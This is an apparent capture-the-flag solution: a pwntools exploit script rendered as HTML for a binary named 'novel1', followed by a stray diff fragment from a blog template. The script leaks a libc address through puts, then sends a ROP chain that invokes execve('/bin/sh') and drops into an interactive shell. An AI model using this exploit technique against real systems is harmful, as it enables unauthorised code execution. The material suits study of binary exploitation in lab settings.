 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./novel1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;47.94.95.135&quot;, 22566)</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">puts_plt = <span class="number">0x0000000000402460</span></span><br><span class="line">puts_got = <span class="number">0x000000000040A108</span></span><br><span class="line">pop_rax_rsp_rdi_rbp_ret = <span class="number">0x0000000004025BE</span></span><br><span class="line">main = <span class="number">0x0000000000402D23</span></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part1</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Evidence:&quot;</span>,<span class="built_in">str</span>(value).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">part2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Chapter:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Blood:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">author = <span class="number">0x000000000040A540</span></span><br><span class="line">rop = p64(puts_got)+p64(<span class="number">0</span>)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment"># rop += p64(pop_rsp_rdi_rbp_ret)+p64(author+)+p64(0)*2+p64(main)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xb</span>,pop_rax_rsp_rdi_rbp_ret)</span><br><span class="line">part1(<span class="number">1</span>+<span class="number">29</span>*<span class="number">0xc</span>,author)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xd</span>,<span class="number">0x16</span>):</span><br><span class="line">    part1(<span class="number">1</span>+<span class="number">29</span>*i,i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">part2(<span class="number">1</span>)</span><br><span class="line">libc_base = get_addr(p) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0x000000000040285A</span>)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(author+<span class="number">0x60</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Author:&quot;</span>,rop)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
 
 		</div>
 
@@ -1484,7 +1464,7 @@
                     </span>
                     
                         <span>
-                            共 120.3k 字
+                            共 120k 字
                         </span>
                     
                 </p>
